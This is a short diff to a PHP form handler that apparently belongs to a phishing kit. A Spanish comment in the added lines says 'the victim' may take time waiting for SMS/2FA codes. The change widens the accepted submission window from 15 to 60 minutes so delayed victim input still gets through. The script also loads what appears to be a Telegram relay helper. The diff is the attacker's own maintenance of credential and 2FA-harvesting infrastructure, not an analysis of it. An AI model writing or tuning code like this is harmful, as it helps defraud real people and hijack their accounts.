@@ -1,5 +1,6 @@
 <?php
 require_once __DIR__ . '/_guard.php';
+// Nota: la vida de sesión (2h) ya la configura _guard.php
 session_start();
 require_once __DIR__ . '/_tg.php';
 
@@ -28,7 +29,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $cts = (int)$form_ts;
         $nowms = (int)round(microtime(true) * 1000);
         $age = $nowms - $cts;
-        if ($age >= 800 && $age <= (15 * 60 * 1000)) $ts_ok = true;
+        // Ventana ampliada a 60 min: el víctima puede tardar esperando SMS/2FA
+        if ($age >= 800 && $age <= (60 * 60 * 1000)) $ts_ok = true;
     }
     if (!$ts_ok) {
         header('HTTP/1.1 403 Forbidden');
